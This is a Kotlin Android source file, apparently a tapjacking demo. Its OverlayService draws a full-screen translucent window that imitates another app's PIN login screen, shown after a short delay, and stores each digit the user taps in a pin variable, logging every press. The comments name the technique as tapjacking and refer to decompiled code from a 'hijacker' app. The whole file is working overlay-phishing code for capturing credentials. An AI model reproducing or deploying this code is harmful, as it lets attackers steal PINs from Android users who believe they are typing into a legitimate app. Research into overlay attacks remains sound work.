package zero.tolerance.sekaidemo

import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.TextView

class OverlayService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: View
    private var position = 0
    private var pin = ""

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()

        // 1. Launch the external activity
        //No need. it is launched automatically by user
//        val externalIntent = Intent()
//        externalIntent.setClassName("com.aimar.id.hijacker", "com.aimar.id.hijacker.LoginActivity")
//        externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // Required since we're starting the activity from a service
//        startActivity(externalIntent)

        // 2. Delay the presentation of the tapjacking view to give time for the activity to launch
        Handler().postDelayed({
            setupTapjackingView()
        }, 1000) // 1 second delay. Adjust as needed.
    }

    private fun setupTapjackingView() {
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
//        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_view, null)
        overlayView = LayoutInflater.from(this).inflate(R.layout.activity_login, null)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            },
//            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            0,
            PixelFormat.TRANSLUCENT
        )

        params.gravity = Gravity.TOP or Gravity.LEFT
        windowManager.addView(overlayView, params)
        initializePinButtons()
        overlayView.findViewById<TextView>(R.id.someTextView).text = "version ${Build.VERSION.SDK_INT}"

        // Sample button to show the overlay is working, can be replaced or removed
        // val btn = overlayView.findViewById<Button>(R.id.sampleButton)
        // btn.setOnClickListener { stopSelf() }
    }

    override fun onDestroy() {
        super.onDestroy()
        windowManager.removeView(overlayView)
    }

    private fun initializePinButtons() {

        val pinButtons = arrayOfNulls<Button>(10)
        val pinButtonIds = intArrayOf(
            R.id.btn0,
            R.id.btn1,
            R.id.btn2,
            R.id.btn3,
            R.id.btn4,
            R.id.btn5,
            R.id.btn6,
            R.id.btn7,
            R.id.btn8,
            R.id.btn9
        )
        for (i in 0..9) {
            pinButtons[i] = overlayView.findViewById<View>(pinButtonIds[i]) as Button
            pinButtons[i]!!.setOnClickListener(View.OnClickListener { view ->
                // from class: com.aimar.id.hijacker.LoginActivity$$ExternalSyntheticLambda0
                // android.view.View.OnClickListener
                m50xa1f9ac48(view as Button)
            })
        }
    }

    fun m50xa1f9ac48(button: Button) {
        val pinTextIds = intArrayOf(R.id.pin1, R.id.pin2, R.id.pin3, R.id.pin4, R.id.pin5, R.id.pin6)
        val pinTexts = arrayOfNulls<TextView>(6)
        for (i in 0..5) {
            pinTexts[i] = overlayView.findViewById<View>(pinTextIds[i]) as TextView
        }

        val i: Int = this.position
        if (i < 6) {
            Log.i("tag", "pressed " + button.text.toString())
            pinTexts.get(i)!!.setText(button.text.toString())
            this.pin += button.text.toString()
            this.position++
        }
    }
}